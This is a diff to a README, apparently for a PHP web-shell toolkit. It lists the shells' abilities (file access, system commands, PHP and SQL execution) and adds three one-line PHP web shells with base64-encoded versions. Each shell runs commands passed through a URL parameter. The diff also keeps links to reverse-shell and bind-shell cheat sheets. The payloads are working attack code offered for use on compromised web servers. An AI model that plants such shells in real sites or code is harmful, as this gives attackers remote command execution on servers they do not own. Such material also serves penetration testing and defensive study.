@@ -14,7 +14,7 @@ shell.php
 - read, edit, delete, upload and download file
 - Execute system commands
 - Execute PHP code
-- Execute MySql queries
+- Execute MySql/PgSql/SQLite queries
 
 mini.php
 - Execute system commands
@@ -29,21 +29,23 @@ This is the base64 version of mini.php. It does not contain '+' and '/' chars to
 
 ### Even more tricks
 
-##### Tiniest PHP shell
+##### Tiny PHP shell
 
-`<?php system($_GET['c'])?>`
+```
+<?=`$_GET[0]`?>					IDw/PWAkX0dFVFswXWA/Pg==
+<?=exec($_GET[0])?>				PD89ZXhlYygkX0dFVFswXSk/Pg==
+<?php system($_GET[0]); ?>		PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4=
+```
 
-`PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pPz4=`
 
 #### Upgrade to a more interactive shell
 
 PHP reverse shell : https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
-PHP bind shell : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md
+PHP bind shell : https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/#php
+
 
 ##### Good resources about shells
 https://www.revshells.com/
 
 https://yolospacehacker.com/hackersguide/en/?cat=Webshell
-
-https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
